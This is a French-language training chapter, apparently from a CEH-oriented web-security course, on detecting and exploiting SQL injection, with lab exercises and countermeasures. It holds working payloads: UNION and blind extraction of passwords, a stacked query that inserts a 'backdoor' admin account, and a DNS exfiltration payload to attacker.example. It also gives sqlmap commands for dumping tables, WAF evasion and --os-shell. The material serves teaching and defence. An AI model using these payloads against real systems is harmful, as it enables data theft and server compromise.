---
title: Injection SQL — détection et exploitation
chapter: 3
course: web-security
difficulty: intermediate
duration: 50
tags: [web, sql-injection, sqlmap]
ceh_modules: ["Module 14 - Hacking Web Applications", "Module 15 - SQL Injection"]
objectives:
  - Comprendre le mécanisme d'une injection SQL et la construire manuellement
  - Distinguer les principaux types d'injection (union-based, boolean-blind, time-blind)
  - Automatiser la détection et l'exploitation avec sqlmap
---

## Introduction

L'injection SQL reste, des années après son entrée dans l'OWASP Top 10, l'une des vulnérabilités les plus fréquemment rencontrées et les plus dévastatrices : elle permet dans le pire des cas de lire, modifier ou supprimer l'intégralité d'une base de données. Ce chapitre construit ta compréhension du mécanisme avant de passer à l'automatisation.

## Le mécanisme d'une injection SQL

Une injection SQL survient quand une entrée utilisateur est concaténée directement dans une requête SQL sans validation ni paramétrage.

```php
// Code vulnérable (PHP)
$query = "SELECT * FROM users WHERE username = '" . $_GET['username'] . "'";
```

```text
Entrée normale :   admin
Requête générée :  SELECT * FROM users WHERE username = 'admin'

Entrée malveillante : ' OR '1'='1
Requête générée :     SELECT * FROM users WHERE username = '' OR '1'='1'
→ La condition est toujours vraie : TOUS les utilisateurs sont retournés.
```

<CehCallout>
`' OR '1'='1` est l'exemple pédagogique classique d'injection SQL, souvent utilisé pour contourner une authentification — mais en pratique, l'objectif principal est presque toujours l'extraction de données via une injection UNION.
</CehCallout>

## Les principaux types d'injection SQL

<CompareTable
  titleA="Type"
  titleB="Principe"
  rows={[
    { a: "Union-based", b: "Utilise l'opérateur SQL UNION pour combiner les résultats d'une requête légitime avec ceux d'une requête arbitraire" },
    { a: "Boolean-blind", b: "La page ne renvoie aucune donnée, mais son comportement (vrai/faux) diffère selon si la condition injectée est vraie" },
    { a: "Time-blind", b: "Utilise une fonction de délai (SLEEP) pour déduire une information bit par bit selon le temps de réponse" },
    { a: "Error-based", b: "Exploite les messages d'erreur SQL renvoyés pour extraire des données directement dans le message" },
  ]}
/>

```sql
-- Union-based : déterminer le nombre de colonnes puis extraire des données
' ORDER BY 3-- -
' UNION SELECT username, password, 3 FROM users-- -

-- Boolean-blind : tester si le premier caractère du mot de passe admin est 'a'
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -

-- Time-blind : si la page met 5 secondes à répondre, la condition est vraie
' AND IF(1=1, SLEEP(5), 0)-- -
```

<TipCallout>
Le commentaire SQL `-- -` (avec l'espace final) neutralise le reste de la requête originale après ton injection — indispensable pour éviter une erreur de syntaxe qui casserait la requête au lieu de l'exploiter.
</TipCallout>

## Automatiser avec sqlmap

sqlmap détecte et exploite automatiquement la quasi-totalité des types d'injection SQL, sur une large variété de moteurs de bases de données.

```bash
# Détecter une injection SQL sur un paramètre GET
sqlmap -u "http://10.10.0.10/produit.php?id=1" --batch

# Lister les bases de données accessibles
sqlmap -u "http://10.10.0.10/produit.php?id=1" --batch --dbs

# Extraire les tables d'une base précise
sqlmap -u "http://10.10.0.10/produit.php?id=1" --batch -D shop --tables

# Extraire le contenu d'une table (ex: comptes utilisateurs)
sqlmap -u "http://10.10.0.10/produit.php?id=1" --batch -D shop -T users --dump
```

<CehCallout>
`--batch` répond automatiquement aux questions interactives de sqlmap avec les valeurs par défaut — pratique en lab, mais en engagement réel, examine chaque question pour affiner la détection sur des cas complexes (WAF, injection dans un en-tête plutôt qu'un paramètre GET).
</CehCallout>

## Techniques avancées

<CompareTable
  titleA="Technique"
  titleB="Principe"
  rows={[
    { a: "Stacked queries", b: "Exécute plusieurs requêtes séparées par un point-virgule dans une seule injection — permet un INSERT/UPDATE/DROP, pas seulement un SELECT, si le moteur et le driver l'autorisent" },
    { a: "Out-of-band (OOB)", b: "Exfiltre des données via un canal différent (requête DNS ou HTTP sortante) quand ni les données ni le temps de réponse ne sont observables directement" },
    { a: "Second-order (injection différée)", b: "La charge est stockée sans effet immédiat, puis interprétée plus tard par une requête différente (ex: champ 'nom' réutilisé tel quel dans un rapport admin)" },
  ]}
/>

```sql
-- Stacked queries : créer un compte administrateur en plus de la requête initiale
1'; INSERT INTO users (username, password, role) VALUES ('backdoor', 'x', 'admin')-- -

-- Out-of-band : exfiltrer le mot de passe admin via une résolution DNS observée côté attaquant
' AND LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE username='admin'), '.attacker.example\\test'))-- -
```

<WarningCallout>
Les stacked queries ne fonctionnent que si le driver de connexion les autorise explicitement (ce n'est pas le cas par défaut pour de nombreux connecteurs PHP/MySQL modernes) — teste toujours en boolean-blind ou union-based avant de supposer qu'une injection est limitée.
</WarningCallout>

### Contourner un WAF avec les tamper scripts de sqlmap

Un pare-feu applicatif (WAF) bloque souvent les motifs d'injection les plus évidents (espaces, mots-clés SQL en majuscules). sqlmap propose des scripts de transformation (`tamper`) qui réécrivent la charge pour contourner ces filtres sans changer son effet.

```bash
# Lister les tamper scripts disponibles
sqlmap --list-tampers

# Contourner un filtrage naïf des espaces et de la casse
sqlmap -u "http://10.10.0.10/produit.php?id=1" --batch --tamper=space2comment,randomcase

# Obtenir un shell système via l'injection (si les privilèges SQL le permettent)
sqlmap -u "http://10.10.0.10/produit.php?id=1" --batch --os-shell
```

<CehCallout>
`--os-shell` transforme une simple injection SQL en exécution de commandes système lorsque le compte SQL dispose des privilèges suffisants (ex: `FILE` sous MySQL) — c'est l'illustration concrète qu'une injection SQL peut parfois mener bien au-delà du vol de données, jusqu'à la compromission complète du serveur.
</CehCallout>

## Contre-mesures

<AttackDefenseTable rows={[
  { phase: "Injection", attack: "Concaténation directe d'une entrée utilisateur dans une requête SQL", defense: "Requêtes préparées (prepared statements) avec paramètres liés — la seule protection réellement fiable" },
  { phase: "Détection", attack: "Messages d'erreur SQL détaillés exploitables", defense: "Désactiver l'affichage des erreurs en production, logger côté serveur uniquement" },
  { phase: "Défense en profondeur", attack: "Un seul point de filtrage contourné suffit", defense: "WAF en complément (jamais en remplacement) des requêtes préparées, principe du moindre privilège sur le compte SQL applicatif" },
]} />

<AuditCallout>
Un compte de base de données applicatif ne devrait jamais disposer de droits d'administration complets — même en cas d'injection SQL réussie, un compte aux droits restreints limite fortement l'impact (pas d'accès à `information_schema` complet, pas de `LOAD_FILE`).
</AuditCallout>

## Lab — Mise en Pratique

**Environnement** : Kali Linux (terminal Nyx Shell) — labs web-001 et web-002

<Steps steps={[
  { title: "Détecter une injection SQL", description: "Teste un paramètre suspect avec une entrée simple.", code: "curl \"http://10.10.0.10/produit.php?id=1'\"" },
  { title: "Automatiser la détection avec sqlmap", description: "Lance sqlmap sur le paramètre identifié.", code: "sqlmap -u \"http://10.10.0.10/produit.php?id=1\" --batch --dbs" },
  { title: "Extraire les identifiants", description: "Une fois la base identifiée, extrais la table des utilisateurs.", code: "sqlmap -u \"http://10.10.0.10/produit.php?id=1\" --batch -D shop -T users --dump" },
  { title: "Aller plus loin (optionnel)", description: "Sur le lab web-001, une fois l'accès obtenu, réfléchis à si un tamper script aurait été nécessaire face à un filtrage plus strict, et pourquoi --os-shell ne fonctionne que si le compte SQL dispose des privilèges adéquats." },
]} />

## En résumé

- Une injection SQL survient quand une entrée utilisateur est concaténée sans validation dans une requête SQL.
- Les principaux types sont union-based, boolean-blind, time-blind et error-based.
- Les stacked queries permettent des requêtes de modification (INSERT/DROP) si le driver les autorise ; l'exfiltration out-of-band (DNS/HTTP) contourne l'absence de canal de réponse direct.
- sqlmap automatise la détection et l'exploitation sur la quasi-totalité des moteurs SQL, y compris le contournement de WAF (tamper scripts) et l'obtention d'un shell système (`--os-shell`) si les privilèges le permettent.
- Les requêtes préparées (prepared statements) sont la seule contre-mesure réellement fiable, un WAF n'étant qu'une protection complémentaire.

## Questions de Révision

1. Pourquoi une injection time-blind fonctionne-t-elle même quand la page ne renvoie aucune donnée visible ?
2. Que fait l'option `--dump` de sqlmap ?
3. Dans quel cas une injection en stacked queries ne fonctionne-t-elle pas, même si l'injection de base est confirmée ?
4. Pourquoi une exfiltration out-of-band est-elle utile quand ni les données ni le temps de réponse ne sont observables ?
5. Pourquoi les requêtes préparées sont-elles considérées comme la seule protection réellement fiable contre l'injection SQL ?
